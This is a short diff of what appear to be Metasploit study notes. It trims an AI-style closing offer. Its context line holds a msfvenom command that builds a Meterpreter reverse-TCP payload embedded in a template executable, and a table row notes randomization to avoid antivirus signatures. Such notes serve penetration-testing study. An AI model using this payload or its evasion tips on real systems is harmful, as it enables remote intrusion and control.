@@ -381,18 +381,3 @@ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x T
 |Randomization|Avoid signatures|
 
 ---
-
-📌 Source reference:
-
----
-
-If you want next:
-
-- 🔥 **Complete Metasploit Master Notes (ALL topics combined in 1 PDF-style)**
-    
-- 💻 **Real-world penetration testing workflow**
-    
-- 🧠 **Exam cheat sheet (ultra short + important)**
-    
-
-Just tell me 👍
